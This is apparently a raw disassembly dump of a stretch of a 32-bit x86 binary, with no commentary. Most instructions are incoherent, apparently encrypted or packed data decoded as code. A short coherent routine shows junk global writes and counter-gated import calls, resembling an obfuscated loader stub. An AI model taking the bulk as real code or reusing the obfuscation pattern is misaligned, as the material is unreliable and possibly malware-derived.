  40d27e:	and    eax,DWORD PTR [esi]
  40d280:	scas   al,BYTE PTR es:[edi]
  40d281:	je     0x40d20f
  40d283:	adc    edx,DWORD PTR [esi-0x13]
  40d286:	and    al,0x57
  40d288:	dec    esi
  40d289:	cwde   
  40d28a:	and    dl,BYTE PTR [ebx-0x67]
  40d28d:	inc    ecx
  40d28e:	pop    esi
  40d28f:	test   ebp,esp
  40d291:	dec    edi
  40d292:	mov    eax,0x432b3a84
  40d297:	(bad)  
  40d298:	inc    BYTE PTR [ecx]
  40d29a:	xchg   esp,eax
  40d29b:	clc    
  40d29c:	sub    al,0x49
  40d29e:	mov    edi,0x94547f8
  40d2a3:	enter  0x48f7,0x3b
  40d2a7:	push   esi
  40d2a8:	sti    
  40d2a9:	push   ebp
  40d2aa:	mov    ah,0x64
  40d2ac:	mov    edx,0x9c4e4a2d
  40d2b1:	ins    DWORD PTR es:[edi],dx
  40d2b2:	test   al,0x7c
  40d2b4:	sar    BYTE PTR [ecx+ebp*8],1
  40d2b7:	test   cl,0x19
  40d2ba:	add    eax,0xc3a9b386
  40d2bf:	inc    ebx
  40d2c0:	addr16 lahf 
  40d2c2:	jo     0x40d2f8
  40d2c4:	fwait
  40d2c5:	adc    BYTE PTR [esi+0x7fe4cb7c],bh
  40d2cb:	ins    DWORD PTR es:[edi],dx
  40d2cc:	sub    edi,DWORD PTR [eax+0x78]
  40d2cf:	cmp    BYTE PTR [edx-0x4f1ad224],0xd3
  40d2d6:	dec    ebp
  40d2d7:	ficomp WORD PTR [edi+0x5a]
  40d2da:	lods   al,BYTE PTR ds:[esi]
  40d2db:	ins    BYTE PTR es:[edi],dx
  40d2dc:	daa    
  40d2dd:	xor    BYTE PTR [edi],0x6c
  40d2e0:	(bad)  
  40d2e1:	jg     0x40d271
  40d2e3:	jno    0x40d2d8
  40d2e5:	fs sahf 
  40d2e7:	lods   al,BYTE PTR ds:[esi]
  40d2e8:	add    eax,0xb03cdef0
  40d2ed:	push   edx
  40d2ee:	imul   edx,DWORD PTR [ebp-0x19cb9027],0x9f925351
  40d2f8:	out    dx,al
  40d2f9:	pop    edx
  40d2fa:	int3   
  40d2fb:	cmp    eax,DWORD PTR [ebp+0x1c5ba3e8]
  40d301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d302:	out    dx,eax
  40d303:	cli    
  40d304:	pop    ebx
  40d305:	and    DWORD PTR [edx+ebx*2-0x6d],esi
  40d309:	and    bh,BYTE PTR [ecx]
  40d30b:	dec    ebx
  40d30c:	stos   BYTE PTR es:[edi],al
  40d30d:	sub    eax,0x43d8803e
  40d312:	das    
  40d313:	mov    cl,0xb7
  40d315:	les    ebx,FWORD PTR [ebp-0x62b7ffa2]
  40d31b:	inc    edx
  40d31c:	jle    0x40d37f
  40d31e:	es in  al,0x36
  40d321:	push   eax
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	js     0x40d3a1
  40d33a:	je     0x40d39a
  40d33c:	mov    al,0x97
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	addr16 mov ebx,0x677cb557
  40d34a:	jle    0x40d3a4
  40d34c:	test   ebp,esi
  40d34e:	(bad)  
  40d34f:	mov    ds:0xcc4819c6,eax
  40d354:	pop    ss
  40d355:	mov    ebx,edx
  40d357:	mov    cl,0x30
  40d359:	rcr    DWORD PTR [edx-0x75205203],0xf8
  40d360:	dec    esi
  40d361:	(bad)  [edx]
  40d363:	arpl   WORD PTR [ebp-0x4e],dx
  40d366:	xchg   ebp,eax
  40d367:	stc    
  40d368:	les    ecx,FWORD PTR [ecx]
  40d36a:	pop    eax
  40d36b:	xchg   BYTE PTR [edi],cl
  40d36d:	adc    DWORD PTR [ebp+0xd],0x1860fa8f
  40d374:	xchg   esp,eax
  40d375:	xchg   esp,eax
  40d376:	or     eax,0xb081812d
  40d37b:	data16 jne 0x40d30d
  40d37e:	aaa    
  40d37f:	xchg   ebp,eax
  40d380:	mov    eax,0x122281c1
  40d385:	jl     0x40d406
  40d387:	push   0xa
  40d389:	mov    ecx,DWORD PTR [ebx+0x64]
  40d38c:	call   0xe92a:0xc0b55fa1
  40d393:	xchg   esp,eax
  40d394:	cmp    BYTE PTR [edi],ah
  40d396:	repz xchg ebx,eax
  40d398:	mov    bh,0x7e
  40d39a:	sbb    BYTE PTR [ebp+0x4f],bl
  40d39d:	fild   WORD PTR es:[ebp-0x44d30911]
  40d3a4:	sbb    edi,eax
  40d3a6:	nop
  40d3a7:	stc    
  40d3a8:	jmp    FWORD PTR [ecx+0x0]
  40d3ab:	xchg   esi,eax
  40d3ac:	iret   
  40d3ad:	js     0x40d35d
  40d3af:	arpl   cx,bp
  40d3b1:	sub    al,0x17
  40d3b3:	or     edi,esi
  40d3b5:	(bad)  
  40d3b6:	jge    0x40d3d3
  40d3b8:	adc    edi,DWORD PTR [ebx+0xd]
  40d3bb:	or     al,0xa5
  40d3bd:	inc    edi
  40d3be:	sbb    eax,0x2d573836
  40d3c3:	xchg   ebx,eax
  40d3c4:	repnz sar DWORD PTR ds:0xbcee5d1e,1
  40d3cb:	cwde   
  40d3cc:	aam    0xdc
  40d3ce:	or     al,0x4b
  40d3d0:	add    eax,0xa628bf96
  40d3d5:	or     bh,BYTE PTR [edi+0x2f9254b5]
  40d3db:	pop    ebp
  40d3dc:	push   ebx
  40d3dd:	stos   DWORD PTR es:[edi],eax
  40d3de:	retf   
  40d3df:	push   0xffffff9e
  40d3e1:	jmp    0x54f74827
  40d3e6:	mov    eax,0x9030a5e4
  40d3eb:	and    eax,0xbdc2c5a0
  40d3f0:	jmp    DWORD PTR [eax+0x6f]
  40d3f3:	in     al,dx
  40d3f4:	jns    0x40d448
  40d3f6:	sti    
  40d3f7:	sahf   
  40d3f8:	push   eax
  40d3f9:	shl    DWORD PTR [edi+0x7ea71ef2],1
  40d3ff:	add    DWORD PTR [esi-0x5933d3c5],esi
  40d405:	sub    eax,DWORD PTR [ebp+0x30]
  40d408:	lods   eax,DWORD PTR ds:[esi]
  40d409:	add    eax,0xd137249c
  40d40e:	lods   al,BYTE PTR ds:[esi]
  40d40f:	xchg   DWORD PTR [esi+0x41],edi
  40d412:	xchg   ebp,eax
  40d413:	jo     0x40d3d8
  40d415:	mov    al,0x12
  40d417:	jno    0x40d3cc
  40d419:	inc    edx
  40d41a:	xor    ecx,DWORD PTR [esi-0x7f416404]
  40d420:	pop    ecx
  40d421:	mov    esp,0xc03fe429
  40d426:	pusha  
  40d427:	inc    esp
  40d428:	adc    BYTE PTR [edx+ecx*4+0x3],bh
  40d42c:	xor    DWORD PTR [ecx-0x3b66dfc7],ecx
  40d432:	pop    esp
  40d433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d434:	and    eax,0x39126ee0
  40d439:	das    
  40d43a:	pop    es
  40d43b:	mov    eax,0x82abb476
  40d440:	mov    es,WORD PTR [ebx+0x6]
  40d443:	call   0x4863:0x575306b
  40d44a:	mov    ebx,0xfacdca8c
  40d44f:	sbb    eax,0x1128adf8
  40d454:	xchg   esp,ebp
  40d456:	rol    BYTE PTR [edx],0xc1
  40d459:	retf   0x1602
  40d45c:	or     al,0xb5
  40d45e:	pinsrw mm3,WORD PTR [ecx+0x59c2e34d],0x81
  40d466:	sti    
  40d467:	mov    bl,0x92
  40d469:	mov    cl,0x7
  40d46b:	adc    DWORD PTR [esi],0x4117088c
  40d471:	inc    edi
  40d472:	mov    al,0xce
  40d474:	jle    0x40d492
  40d476:	pop    esi
  40d477:	jp     0x40d4d6
  40d479:	xor    DWORD PTR [edi+0x5e],edi
  40d47c:	cmp    esp,ecx
  40d47e:	cdq    
  40d47f:	test   eax,0x433e47a8
  40d484:	(bad)  
  40d485:	js     0x40d416
  40d487:	mov    esi,0x80f25701
  40d48c:	mov    al,ds:0x40996e15
  40d491:	pop    esi
  40d492:	out    dx,al
  40d493:	dec    ebx
  40d494:	sar    BYTE PTR [edx-0x31],cl
  40d497:	lds    ecx,FWORD PTR [ebx+0x9]
  40d49a:	in     al,dx
  40d49b:	repz mov esp,edi
  40d49e:	pushf  
  40d49f:	and    DWORD PTR [esi+0x6c3375b0],eax
  40d4a5:	mov    ds,WORD PTR [ecx]
  40d4a7:	loop   0x40d4e8
  40d4a9:	ficom  WORD PTR [ebx+0x7f]
  40d4ac:	in     al,dx
  40d4ad:	xchg   ebx,eax
  40d4ae:	shr    esi,0x40
  40d4b1:	pushf  
  40d4b2:	retf   0xc9bf
  40d4b5:	pmulhw mm6,mm3
  40d4b8:	mov    ecx,0x4be239a7
  40d4bd:	jns    0x40d466
  40d4bf:	and    eax,0xa952b965
  40d4c4:	or     DWORD PTR [esi+0x15],esi
  40d4c7:	pop    edx
  40d4c8:	enter  0xaa9d,0xbf
  40d4cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4cd:	fmul   DWORD PTR [ebp+0x5e]
  40d4d0:	shl    al,0xe8
  40d4d3:	inc    eax
  40d4d4:	cmp    eax,0x4145ad63
  40d4d9:	mov    DWORD PTR [edi-0x7c],eax
  40d4dc:	ja     0x40d460
  40d4de:	add    ch,bh
  40d4e0:	cmp    eax,0x43ea66f1
  40d4e5:	mov    bh,BYTE PTR gs:[edx-0x348b7177]
  40d4ec:	xor    al,0xf0
  40d4ee:	mov    BYTE PTR [edi+0x23],0xc1
  40d4f2:	arpl   si,bp
  40d4f4:	mov    esp,0xfeb608a
  40d4f9:	mov    DWORD PTR [ecx+0x133773dc],esi
  40d4ff:	nop
  40d500:	xchg   esi,eax
  40d501:	add    ecx,DWORD PTR [ecx+0x4c]
  40d504:	je     0x40d4e8
  40d506:	repnz mov ecx,0x32d7b9e0
  40d50c:	adc    al,BYTE PTR [ebx-0x15]
  40d50f:	popa   
  40d510:	das    
  40d511:	push   eax
  40d512:	mov    ds,WORD PTR ds:0x91cdc668
  40d518:	(bad)  
  40d519:	mov    esi,0x3b9885b1
  40d51e:	in     al,dx
  40d51f:	jmp    0xb42cd06a
  40d524:	xchg   edx,eax
  40d525:	dec    esp
  40d526:	push   ds
  40d527:	xchg   DWORD PTR ds:0x8505d183,esp
  40d52d:	out    0xcd,eax
  40d52f:	push   ebp
  40d530:	mov    cl,0xa5
  40d532:	pop    edi
  40d533:	adc    eax,0x38f3780b
  40d538:	hlt    
  40d539:	into   
  40d53a:	repz jmp FWORD PTR [esi-0x5a]
  40d53e:	idiv   DWORD PTR [ebx]
  40d540:	cmp    BYTE PTR [eax],0x68
  40d543:	jo     0x40d4df
  40d545:	into   
  40d546:	dec    DWORD PTR [esi+esi*4+0x69386fa]
  40d54d:	(bad)  
  40d54f:	sbb    eax,0x64a91607
  40d554:	jbe    0x40d4e0
  40d556:	mov    ebp,edi
  40d558:	loop   0x40d4f0
  40d55a:	push   ds
  40d55b:	mov    ebx,0xf1d17f2
  40d560:	xor    dh,ch
  40d562:	xchg   esp,eax
  40d563:	or     bh,BYTE PTR [ebx-0x2a78ddfa]
  40d569:	push   0x800f2ef
  40d56e:	xor    BYTE PTR [esi+0x7a],ch
  40d571:	dec    edi
  40d572:	sbb    BYTE PTR [ebp-0x5f],bl
  40d575:	sbb    cl,BYTE PTR [esi+0x5d2aff0e]
  40d57b:	adc    DWORD PTR [edi-0x3c],esp
  40d57e:	sub    eax,0xba88181a
  40d583:	(bad)  
  40d584:	xor    BYTE PTR [eax+0x12],ch
  40d587:	push   0xffffffb5
  40d589:	adc    al,BYTE PTR [ebx+0x3]
  40d58c:	sbb    al,0x1a
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x433823,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433817,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43381b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x433827,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x433863
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43381b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x4338a7,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x4338af,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x4337db,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x43385b,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433897,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433897
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433897,edx
  40d64f:	cmp    DWORD PTR ds:0x433897,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433897,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x4337e3,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x4337e3
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x4337e3,edx
  40d68b:	cmp    DWORD PTR ds:0x4337e3,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x4338d3
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x4337e3,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x4337e7
  40d6b7:	add    eax,DWORD PTR ds:0x43381b
  40d6bd:	mov    ds:0x4337e7,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0xe8a0482a
  40d6f9:	retf   0xb56d
  40d6fc:	jp     0x40d690
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d687
  40d705:	push   edi
  40d706:	mov    edx,0x3879725a
  40d70b:	cmp    al,0x88
  40d70d:	rcr    DWORD PTR ds:0x28510ada,0xdc
  40d714:	inc    eax
  40d715:	pushf  
  40d716:	aaa    
  40d717:	shl    DWORD PTR [ebp+0x3a],1
  40d71a:	enter  0x157b,0x69
  40d71e:	imul   esi,DWORD PTR [ebp+0x1e],0x80624a2a
  40d725:	(bad)  
  40d726:	aas    
  40d727:	loopne 0x40d762
  40d729:	loope  0x40d793
  40d72b:	call   0xc479:0xe8f3520e
  40d732:	es daa 
  40d734:	or     al,0xf7
  40d736:	xchg   ebp,eax
  40d737:	inc    ebp
  40d738:	and    cl,BYTE PTR [ebx+0x25]
  40d73b:	sub    al,0xa4
  40d73d:	(bad)  
  40d73e:	pop    ss
  40d73f:	ficom  WORD PTR [edi]
  40d741:	cs jne 0x40d6cc
  40d744:	push   edi
  40d745:	sub    esp,DWORD PTR [esi+eiz*1]
  40d748:	mov    ebx,0xa0ff374
  40d74d:	pop    eax
  40d74e:	in     al,0x9b
  40d750:	scas   al,BYTE PTR es:[edi]
  40d751:	jae    0x40d760
  40d753:	dec    esp
  40d754:	pop    ebx
  40d755:	ret    0xfc18
  40d758:	xchg   BYTE PTR [ebx],ah
  40d75a:	popa   
  40d75b:	cld    
  40d75c:	mov    al,0x25
  40d75e:	xor    eax,0xf073ecfd
  40d763:	push   edx
  40d764:	push   edx
  40d765:	mov    bl,0x21
  40d767:	xor    DWORD PTR [eax],ecx
  40d769:	push   ebx
  40d76a:	shl    ecx,1
  40d76c:	out    0x95,eax
  40d76e:	jnp    0x40d795
  40d770:	das    
  40d771:	test   eax,0x5f06e8a
  40d776:	mov    esp,0x7b1ed02
  40d77b:	sub    al,0x1e
  40d77d:	xor    BYTE PTR ds:0xf8ec8fdc,0x62
  40d784:	mov    esi,0x3810fc19
  40d789:	adc    al,0x5b
  40d78b:	mov    ?,WORD PTR [eax+ecx*8]
  40d78e:	js     0x40d799
  40d790:	repz add DWORD PTR [esi-0x961c36a],ebx
  40d797:	dec    edx
  40d798:	mov    bh,0x6
  40d79a:	das    
  40d79b:	call   0x3f80:0x862b8b78
  40d7a2:	cmp    bl,0xaa
  40d7a5:	fcmovnb st,st(1)
  40d7a7:	cs loopne 0x40d802
  40d7aa:	and    edi,DWORD PTR [ecx-0x56]
  40d7ad:	js     0x40d7d7
  40d7af:	jp     0x40d75d
  40d7b1:	xor    cl,BYTE PTR [edx-0x44]
  40d7b4:	mov    ebx,0xce207b6d
  40d7b9:	mov    bl,0x77
  40d7bb:	xchg   esi,eax
  40d7bc:	pop    ebp
  40d7bd:	(bad)  
  40d7be:	out    0xe6,al
  40d7c0:	ja     0x40d7ff
  40d7c2:	jno    0x40d767
  40d7c4:	mov    esi,0xcfa669af
  40d7c9:	sub    ebx,DWORD PTR [ebx-0x45c8367a]
  40d7cf:	pop    edi
  40d7d0:	loop   0x40d770
  40d7d2:	add    esi,DWORD PTR [ecx+0x3a7aaeff]
  40d7d8:	mov    eax,ds:0x699e90bc
  40d7dd:	icebp  
  40d7de:	or     al,0xa7
  40d7e0:	out    0x34,eax
  40d7e2:	and    ah,BYTE PTR [ecx-0x9]
  40d7e5:	mov    esp,0x6d7704c2
  40d7ea:	cmp    BYTE PTR [edi+eiz*2+0x28f8d786],bl
  40d7f1:	loop   0x40d7b5
  40d7f3:	lods   al,BYTE PTR ds:[esi]
  40d7f4:	stc    
  40d7f5:	mov    bh,0x39
  40d7f7:	and    BYTE PTR [ecx+edx*1],0xd1
  40d7fb:	inc    esp
  40d7fc:	(bad)  
  40d7fe:	push   0x4
  40d800:	stc    
  40d801:	mov    fs,WORD PTR ds:0x7275b20f
  40d807:	loop   0x40d85a
  40d809:	aad    0xb4
  40d80b:	into   
  40d80c:	and    eax,0x74ef53eb
  40d811:	pop    ebp
  40d812:	dec    edi
  40d813:	mov    dl,0xa4
  40d815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d816:	hlt    
  40d817:	sbb    BYTE PTR [ebx+0x27],0xa0
  40d81b:	lods   al,BYTE PTR ds:[esi]
  40d81c:	xchg   DWORD PTR [edi+0x7a6b651a],esp
  40d822:	es int 0xce
  40d825:	jns    0x40d865
  40d827:	imul   esi,DWORD PTR [edx],0x26ae15a2
  40d82d:	mov    ch,0xaf
  40d82f:	ficomp WORD PTR [edi]
  40d831:	push   esp
  40d832:	adc    ecx,DWORD PTR [esi]
  40d834:	mov    al,ds:0x604be2e1
  40d839:	stos   DWORD PTR es:[edi],eax
  40d83a:	and    DWORD PTR [ebx+0x7],edx
  40d83d:	jae    0x40d7c4
  40d83f:	xor    al,0x79
  40d841:	pop    ebp
  40d842:	mov    ebx,0x3dfafce8
  40d847:	mov    esp,0x9f5c1045
  40d84c:	cwde   
  40d84d:	inc    edi
  40d84e:	adc    DWORD PTR [eax+0x59],eax
  40d851:	and    bh,BYTE PTR [edx]
  40d853:	xchg   edx,eax
  40d854:	adc    BYTE PTR es:[edx-0x7b56e56e],dh
  40d85b:	shl    edx,0xe4
  40d85e:	mov    edx,0xfca1c308
  40d863:	xor    edx,DWORD PTR ss:[ebx+0x232487fa]
  40d86a:	xchg   ecx,eax
  40d86b:	push   ecx
  40d86c:	cli    
  40d86d:	pop    edi
  40d86e:	imul   DWORD PTR [eax+0x29]
  40d871:	int3   
  40d872:	pop    eax
  40d873:	inc    ebx
  40d874:	jmp    0xd172:0x2a2b085c
  40d87b:	sbb    al,0x78
  40d87d:	sbb    BYTE PTR [ecx+0xd98b683],0xf5
  40d884:	pop    edx
  40d885:	pop    ebp
  40d886:	or     bl,BYTE PTR [edi+0x738e09d1]
  40d88c:	or     al,0x9c
  40d88e:	test   eax,0xebd50e9a
  40d893:	dec    edi
  40d894:	mov    ds:0x83042e14,eax
  40d899:	fdivp  st(0),st
  40d89b:	cwde   
  40d89c:	sbb    al,0x21
  40d89e:	cmp    dl,BYTE PTR [ecx]
  40d8a0:	clc    
  40d8a1:	sub    DWORD PTR [eax-0x52],ebp
  40d8a4:	mov    esp,0x9ba4f975
  40d8a9:	outs   dx,DWORD PTR ds:[esi]
  40d8aa:	nop
  40d8ab:	scas   eax,DWORD PTR es:[edi]
  40d8ac:	push   esp
  40d8ad:	add    DWORD PTR [edx+edi*1],eax
  40d8b0:	mov    bh,0x2a
  40d8b2:	jae    0x40d91a
  40d8b4:	xchg   ecx,eax
  40d8b5:	neg    BYTE PTR [edi+0x23]
  40d8b8:	xor    al,0x8a
  40d8ba:	fwait
  40d8bb:	sbb    eax,0x2fd37d06
  40d8c0:	add    eax,0xc9e139eb
  40d8c5:	xor    dl,bh
  40d8c7:	xor    DWORD PTR [edx+esi*8],ebx
  40d8ca:	ins    BYTE PTR es:[edi],dx
  40d8cb:	stos   BYTE PTR es:[edi],al
  40d8cc:	cmp    DWORD PTR [ebp+0xd8f8b45],esi
  40d8d2:	push   ebx
  40d8d3:	xlat   BYTE PTR ds:[ebx]
  40d8d4:	cmp    ecx,edi
  40d8d6:	mov    ebp,0x4a0b3b9a
  40d8db:	aad    0xde
  40d8dd:	sbb    al,0x13
  40d8df:	push   esp
  40d8e0:	mov    gs,ebp
  40d8e2:	add    BYTE PTR [ebx+ecx*2-0x1c],bl
  40d8e6:	mov    dh,0x4a
  40d8e8:	dec    esi
  40d8e9:	mov    ebp,0x3227a087
  40d8ee:	(bad)  
  40d8ef:	mov    bh,0x83
  40d8f1:	sub    edi,DWORD PTR gs:[esi]
  40d8f4:	push   esp
  40d8f5:	dec    eax
  40d8f6:	outs   dx,DWORD PTR ds:[esi]
  40d8f7:	inc    ebp
  40d8f8:	loopne 0x40d8be
  40d8fa:	jmp    0x40d908
  40d8fc:	pmaddwd mm7,QWORD PTR [esi-0x71]
  40d900:	scas   al,BYTE PTR es:[edi]
  40d901:	ins    BYTE PTR es:[edi],dx
  40d902:	out    dx,al
  40d903:	push   eax
  40d904:	add    esi,eax
  40d906:	daa    
  40d907:	mov    ah,0xe5
  40d909:	cmp    BYTE PTR [ecx+edx*4-0x52],dh
  40d90d:	pop    ds
  40d90e:	stos   BYTE PTR es:[edi],al
  40d90f:	nop
  40d910:	test   DWORD PTR [eax+0x64],ebp
  40d913:	pop    DWORD PTR [edi+0x77]
  40d916:	rol    DWORD PTR [edi-0x66],0xbf
  40d91a:	xor    ebx,DWORD PTR [eax+edx*4+0x5c994ed7]
  40d921:	cmc    
  40d922:	adc    ah,BYTE PTR [eax+0x7c]
  40d925:	pop    ecx
  40d926:	imul   edx,eax,0xffffffae
  40d929:	mov    bh,0xca
  40d92b:	daa    
  40d92c:	pop    esi
  40d92d:	cdq    
  40d92e:	jno    0x40d9a7
  40d930:	adc    al,0xb6
  40d933:	loope  0x40d949
  40d935:	mov    eax,0xc33f9a61
  40d93a:	cs jp  0x40d9ab
  40d93d:	mov    ds:0xa79d3b04,eax
  40d942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d943:	or     al,0x89
  40d945:	add    DWORD PTR [ebx-0xd1607bb],ecx
  40d94b:	add    al,0x0
  40d94d:	add    BYTE PTR [ebx+0x4d8bfc45],cl
  40d953:	adc    BYTE PTR [ebx],dh
  40d955:	mov    DWORD PTR [ebx],0x258e9c6
  40d95b:	add    BYTE PTR [eax],al
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0xe62b51ed
  40d96a:	add    BYTE PTR [edx-0x74],ah
  40d96d:	cmp    dl,BYTE PTR [eax+0x7c3e7e7e]
  40d973:	jle    0x40d9f3
  40d975:	rol    BYTE PTR [edx-0x76],1
  40d978:	sub    edx,DWORD PTR [edi+ecx*2-0x64ac1a15]
  40d97f:	adc    BYTE PTR [ebx],bl
  40d981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d982:	mov    eax,ds:0xc731b64c
  40d987:	jns    0x40d910
  40d989:	xor    dl,dh
  40d98b:	ror    DWORD PTR [edi+eax*1-0x29],0xfc
  40d990:	(bad)  
  40d991:	push   ecx
  40d992:	adc    DWORD PTR [ecx-0x69],edi
  40d995:	jae    0x40d9e8
  40d997:	ds mov ebp,0xcdb3696
  40d99d:	jmp    0x4b18b1da
  40d9a2:	in     eax,0x52
  40d9a4:	jl     0x40d9a0
  40d9a6:	push   0xa2985a47
  40d9ab:	cdq    
  40d9ac:	adc    BYTE PTR [eax],cl
  40d9ae:	mov    ah,0xb2
  40d9b0:	sub    DWORD PTR [ebp+0x6f],edi
  40d9b3:	sub    al,0xe8
  40d9b5:	or     DWORD PTR [ebx-0x54ab6f19],ebp
  40d9bb:	inc    esi
  40d9bc:	push   esi
  40d9bd:	inc    edx
  40d9be:	popf   
  40d9bf:	xor    DWORD PTR [ebx-0x3ffe622a],ebp
  40d9c5:	jne    0x40d9c0
  40d9c7:	push   ds
  40d9c8:	imul   ebx,DWORD PTR [edx],0x9f8e2ebf
  40d9ce:	xor    cl,BYTE PTR es:[ecx+esi*1-0x10d26472]
  40d9d6:	popa   
  40d9d7:	test   ecx,ebp
  40d9d9:	fs mov ecx,0x6e06b983
  40d9df:	cmc    
  40d9e0:	stos   BYTE PTR es:[edi],al
  40d9e1:	mov    cl,0x29
  40d9e3:	loope  0x40da22
  40d9e5:	sub    eax,0xb6de3830
  40d9ea:	test   BYTE PTR [edi+0x797e9c59],dh
  40d9f0:	inc    ebp
  40d9f1:	push   0xf5183cdb
  40d9f6:	sub    eax,DWORD PTR [edi]
  40d9f8:	outs   dx,BYTE PTR ds:[esi]
  40d9f9:	dec    ecx
  40d9fa:	sbb    DWORD PTR [ebx+ebx*1+0x8ff22e7],ebx
  40da01:	std    
  40da02:	scas   eax,DWORD PTR es:[edi]
  40da03:	fst    DWORD PTR ds:0x7821ef6b
  40da09:	mov    WORD PTR [ebp+0x50],es
  40da0c:	cmp    ah,bh
  40da0e:	xchg   esi,eax
  40da0f:	xchg   ax,ax
  40da11:	iret   
  40da12:	xor    al,0xc3
  40da14:	loop   0x40d9b8
  40da16:	jge    0x40da18
  40da18:	out    0xe7,al
  40da1a:	mov    ecx,0xa5b4bb3f
  40da1f:	lods   al,BYTE PTR ds:[esi]
  40da20:	mov    cl,0xd1
  40da22:	add    bl,dl
  40da24:	sub    ebx,DWORD PTR ss:[ebx]
  40da27:	les    eax,FWORD PTR [esi]
  40da29:	mov    ch,0xf9
  40da2b:	sub    eax,0xadef20ad
  40da30:	add    al,0xd
  40da32:	fistp  QWORD PTR ds:0x6bd5186b
  40da38:	xor    eax,0x366e7975
  40da3d:	mov    ds:0xd25d2cd6,al
  40da42:	jnp    0x40da39
  40da44:	scas   al,BYTE PTR es:[edi]
  40da45:	jbe    0x40da7d
  40da47:	shr    DWORD PTR [eax-0x7f06d6d1],1
  40da4d:	jns    0x38a5eb01
  40da53:	jle    0x40da2c
  40da55:	xchg   DWORD PTR [esi-0x2b118db3],esi
  40da5b:	ret    
  40da5c:	mov    ah,0xde
  40da5e:	inc    eax
  40da5f:	fs mov BYTE PTR fs:[esi],ch
  40da63:	mov    edx,gs
  40da65:	(bad)  
  40da66:	jns    0x40d9fd
  40da68:	jge    0x40da47
  40da6a:	push   esp
  40da6b:	test   dh,ah
  40da6d:	fstp   QWORD PTR [esi-0x4ac7722d]
  40da73:	push   ds
  40da74:	(bad)  
  40da75:	jns    0x40dab6
  40da77:	fs sub al,bh
  40da7a:	shl    BYTE PTR ds:0x62cc6f21,cl
  40da80:	or     eax,0x2b2e5d28
  40da85:	ins    BYTE PTR es:[edi],dx
  40da86:	or     BYTE PTR [esi],bl
  40da88:	or     DWORD PTR [ebp-0x22],eax
  40da8b:	jmp    0x40da0f
  40da8d:	lahf   
  40da8e:	mov    BYTE PTR [ecx],dh
  40da90:	iret   
  40da91:	fsubr  QWORD PTR [esp+ebp*8-0x46ed51b1]
  40da98:	xor    al,0x7
  40da9a:	xchg   edi,eax
  40da9b:	push   ss
  40da9c:	sub    esi,esp
  40da9e:	pop    eax
  40da9f:	inc    esi
  40daa0:	aad    0xbc
  40daa2:	mov    esi,0xf7fb90b1
  40daa7:	and    DWORD PTR [eax-0x5792a691],ebx
